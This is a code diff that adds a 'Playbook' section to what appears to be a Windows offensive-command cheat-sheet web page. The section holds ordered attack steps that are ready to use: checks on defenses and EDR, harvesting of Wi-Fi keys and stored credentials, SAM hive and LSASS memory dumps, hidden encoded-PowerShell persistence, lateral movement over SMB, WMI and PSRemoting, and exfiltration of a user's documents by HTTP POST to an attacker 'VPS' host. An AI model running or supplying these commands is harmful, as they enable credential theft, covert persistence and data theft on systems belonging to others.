@@ -105,6 +105,8 @@
   .tag.postexploit.active { background: #ff9800; color: #fff; }
   .tag.lateral { color: #00bcd4; border-color: #00bcd4; }
   .tag.lateral.active { background: #00bcd4; color: #fff; }
+  .tag.playbook { color: #ffeb3b; border-color: #ffeb3b; }
+  .tag.playbook.active { background: #ffeb3b; color: #000; }
   .cmd-tag.c2 { color: #ff6b35; border-color: #ff6b35; }
   .cmd-tag.privesc { color: #9b59b6; border-color: #9b59b6; }
   .cmd-tag.persist { color: #e74c3c; border-color: #e74c3c; }
@@ -112,6 +114,7 @@
   .cmd-tag.evasion { color: #e91e63; border-color: #e91e63; }
   .cmd-tag.postexploit { color: #ff9800; border-color: #ff9800; }
   .cmd-tag.lateral { color: #00bcd4; border-color: #00bcd4; }
+  .cmd-tag.playbook { color: #ffeb3b; border-color: #ffeb3b; }
   .cmd-count {
     text-align: center;
     font-size: 0.6rem;
@@ -222,6 +225,7 @@
   <div class="tag evasion" data-filter="evasion">Evasion</div>
   <div class="tag postexploit" data-filter="postexploit">Post-Exploit</div>
   <div class="tag lateral" data-filter="lateral">Lateral</div>
+  <div class="tag playbook" data-filter="playbook">Playbook</div>
 </div>
 
 <div class="cmd-count" id="count">Loading...</div>
@@ -1166,6 +1170,168 @@ const COMMANDS = [
     code: "schtasks /delete /tn \"KeepAlive\" /f",
     tags: ["cmd"],
     accent: "#00f0ff"
+  },
+  {
+    title: "[P1] Situational Awareness",
+    code: "whoami /all\nhostname\nipconfig /all\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nnet localgroup administrators\nwhoami /groups | findstr \"S-1-16-12288\"",
+    tags: ["playbook", "recon"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P2] Defender Status Check",
+    code: "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected",
+    tags: ["playbook", "defender", "recon"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P2] Check Exclusions (Gold)",
+    code: "Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension",
+    tags: ["playbook", "defender", "recon"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P2] Detect EDR/AV Processes",
+    code: "Get-Process | Where-Object {$_.ProcessName -match 'defender|sentinel|crowd|carbon|cylance|sophos|symantec|mcafee|kasper|eset|trend|avg|avast'}",
+    tags: ["playbook", "recon"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P2] Check PS Logging",
+    code: "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"\nreg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\"",
+    tags: ["playbook", "recon", "evasion"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P3] WiFi Passwords",
+    code: "netsh wlan show profiles | Select-String 'All User' | %{ netsh wlan show profile name=($_ -split ':')[1].Trim() key=clear }",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P3] Saved Credentials",
+    code: "cmdkey /list",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P3] Find Unattend Files",
+    code: "Get-ChildItem -Path C:\\ -Recurse -Include 'unattend.xml','sysprep.xml','autounattend.xml' -ErrorAction SilentlyContinue",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P3] Web.config Connection Strings",
+    code: "Get-ChildItem -Path C:\\inetpub -Recurse -Include 'web.config' -ErrorAction SilentlyContinue | Select-String 'connectionString'",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P3] PowerShell History",
+    code: "Get-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P4] Unquoted Service Paths",
+    code: "wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'",
+    tags: ["playbook", "privesc"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P4] AlwaysInstallElevated Check",
+    code: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+    tags: ["playbook", "privesc"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P4] Weak Service Permissions",
+    code: "Get-WmiObject win32_service | Where-Object {$_.PathName -notlike 'C:\\Windows\\*'} | Select-Object Name, PathName, StartMode, State",
+    tags: ["playbook", "privesc"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P4] Token Privs (Potato Check)",
+    code: "whoami /priv | findstr 'SeImpersonate SeAssignPrimaryToken'",
+    tags: ["playbook", "privesc"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P5] Dump SAM/SYSTEM Hives",
+    code: "mkdir C:\\temp -Force\nreg save HKLM\\SAM C:\\temp\\sam.save\nreg save HKLM\\SYSTEM C:\\temp\\system.save",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P5] LSASS Dump (comsvcs)",
+    code: "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P6] Registry Run Persistence",
+    code: "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Update' -Value 'powershell -w hidden -enc BASE64'",
+    tags: ["playbook", "persist"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P6] Scheduled Task Persistence",
+    code: "schtasks /create /tn 'WindowsUpdate' /tr 'powershell -w hidden -enc BASE64' /sc onlogon /ru SYSTEM /f",
+    tags: ["playbook", "persist"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P6] Service Persistence",
+    code: "sc create UpdateSvc binPath= 'cmd /c powershell -enc BASE64' start= auto",
+    tags: ["playbook", "persist"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P7] Find Hosts (ARP/Domain)",
+    code: "arp -a\nnet view /domain\nnet group 'Domain Computers' /domain\nnltest /dclist:",
+    tags: ["playbook", "lateral", "recon"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P7] SMB Access Check",
+    code: "net use \\\\TARGET\\C$ /user:DOMAIN\\user password\ndir \\\\TARGET\\C$\\Users",
+    tags: ["playbook", "lateral"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P7] PSRemoting Check",
+    code: "Test-WSMan -ComputerName TARGET\nEnter-PSSession -ComputerName TARGET",
+    tags: ["playbook", "lateral"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P7] WMI Remote Exec",
+    code: "wmic /node:'TARGET' process call create 'powershell -enc BASE64'",
+    tags: ["playbook", "lateral", "c2"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P8] Domain Enumeration",
+    code: "net user /domain\nnet group 'Domain Admins' /domain\nnltest /trusted_domains",
+    tags: ["playbook", "recon"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P8] GPP Password Check",
+    code: "findstr /S /I cpassword \\\\DOMAIN\\sysvol\\*.xml",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P9] Compress for Exfil",
+    code: "Compress-Archive -Path C:\\Users\\target\\Documents -DestinationPath C:\\temp\\docs.zip",
+    tags: ["playbook", "postexploit"],
+    accent: "#ffeb3b"
+  },
+  {
+    title: "[P9] HTTP Exfil",
+    code: "$bytes = [IO.File]::ReadAllBytes('C:\\temp\\docs.zip')\nInvoke-WebRequest -Uri 'http://VPS:8080/upload' -Method POST -Body $bytes",
+    tags: ["playbook", "postexploit", "c2"],
+    accent: "#ffeb3b"
   },
 ];
 
